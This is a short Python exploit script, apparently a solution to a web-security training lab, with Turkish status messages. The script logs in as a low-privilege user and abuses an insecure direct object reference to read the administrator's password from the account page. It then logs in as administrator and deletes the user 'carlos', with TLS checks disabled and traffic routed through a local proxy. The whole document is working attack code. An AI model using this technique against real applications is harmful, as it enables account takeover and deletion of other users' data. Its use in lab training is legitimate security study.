import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import re

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080' }


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf


def admin_password(s, url):
     login_url = url+"/login"
     csrf_token = get_csrf_token(s,login_url)
     print("(+) Login viener")
     data = {"csrf": csrf_token,
            "username": "wiener",
            "password": "peter"}
    
     r = s.post(login_url, data=data, verify=False, proxies=proxies)
     res = r.text
     if "Log out" in res:
        print("[+] Giriş okey")

        admin_url = url +"/my-account?id=administrator"
        r = s.get(admin_url, verify=False, proxies=proxies)
        res = r.text
        if "administrator" in res: 
             print("[+] administrator parola okey")
             soup = BeautifulSoup(r.text, 'html.parser')
             password = soup.find("input", {'name':'password'})['value']
             return password
             
        else:
             print("[+] parola alamadım.")
             sys.exit(-1)

     else:
        print("[+] Giriş yok")
        sys.exit(-1)

def delete_carlos_user(s, url, password):
     login_url = url+"/login"
     csrf_token = get_csrf_token(s,login_url)
     print("(+) Login administrator")
     data = {"csrf": csrf_token,
            "username": "administrator",
            "password": password}
    
     r = s.post(login_url, data=data, verify=False, proxies=proxies)
     res = r.text
     if "Log out" in res:
        print("[+] Admin Giriş okey")
        delete_carlos_url = url + 'admin/delete?username=carlos'
        r = requests.get(delete_carlos_url, verify=False, proxies=proxies )
        if r.status_code==200:
             print("[+] Carlos Delete Completed")
        else:
            print("[-] Carlos Delete Error")
            sys.exit(-1)

    
     else:
           print("[+] Admin Giriş okey değil ")





if __name__ == "__main__":
    if len(sys.argv) !=2:
          print("(+) usage %s <url>" %sys.argv[0])
          print("(+) Example Url  %s www.example.com " %sys.argv[0])
          sys.exit(-1)
    
  
    s = requests.Session()
    url = sys.argv[1]
    admin_pass = admin_password(s, url)
    print("[+] Admin panel arıyorum.......")
    delete_carlos_user(s, url, admin_pass)



